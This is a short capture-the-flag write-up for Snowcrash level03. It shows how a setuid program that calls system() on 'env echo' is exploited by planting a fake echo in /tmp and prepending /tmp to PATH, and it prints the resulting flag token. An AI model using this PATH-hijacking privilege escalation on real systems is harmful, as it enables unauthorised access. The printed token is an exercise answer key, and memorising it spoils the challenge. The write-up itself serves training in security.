# <center>Snowcrash level03</center>

# Explanations

<br/>

## On VM:
> $ ls -l
>> -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

> $ nm -u ./level03
>>U system@@GLIBC_2.0

> $ ltrace ./level03
>> system("/usr/bin/env echo Exploit me"Exploit me

- The program uses the function system() of the global lib C to execute the echo command.
- We are going to locate the getflag program in the system and run it by replacing the echo command.

> $ find / -name getflag
>> /bin/getflag

> $ echo '/bin/getflag' > /tmp/echo<br/>
> $ chmod 777 /tmp/echo<br/>
> $ export PATH=/tmp:$PATH<br/>
> $ ./level03<br/>
>> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus